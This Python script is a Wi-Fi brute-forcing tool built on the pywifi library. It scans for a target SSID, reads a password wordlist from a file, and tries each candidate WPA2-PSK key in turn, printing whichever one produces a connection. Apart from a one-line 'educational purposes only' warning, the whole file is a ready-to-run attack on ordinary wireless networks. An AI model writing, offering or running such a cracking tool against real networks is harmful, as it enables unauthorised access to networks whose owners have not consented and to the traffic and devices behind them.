import time
from pywifi import PyWiFi, const, Profile

def wifi_brute_forcer(ssid, password_list):
    wifi = PyWiFi()
    iface = wifi.interfaces()[0]

    iface.scan()
    time.sleep(2)
    results = iface.scan_results()

    target_found = any(network.ssid == ssid for network in results)

    if not target_found:
        print("Target SSID not found!")
        return

    for password in password_list:
        print(f"Trying password: {password}")
        profile = Profile()
        profile.ssid = ssid
        profile.auth = const.AUTH_ALG_OPEN
        profile.akm.append(const.AKM_TYPE_WPA2PSK)
        profile.cipher = const.CRYPT_TYPE_CCMP
        profile.key = password

        iface.remove_all_networks()
        iface.add_network(profile)

        iface.connect(iface.add_network(profile))
        time.sleep(2)

        if iface.status() == const.IFACE_CONNECTED:
            print(f"Password found: {password}")
            return
        else:
            print(f"Password {password} failed.")

    print("Password not found in the provided list.")

def main():
    print("WARNING: This script is intended for educational purposes only. Ensure you have permission to test the target network.")
    ssid = input("Enter the SSID of the target network: ")
    password_file = input("Enter the path to the password list file: ")

    try:
        with open(password_file, 'r') as f:
            password_list = [line.strip() for line in f.readlines()]
    except FileNotFoundError:
        print("Password file not found. Please check the path and try again.")
        return
    except Exception as e:
        print(f"An error occurred while reading the password file: {e}")
        return

    wifi_brute_forcer(ssid, password_list)

if __name__ == "__main__":
    main()
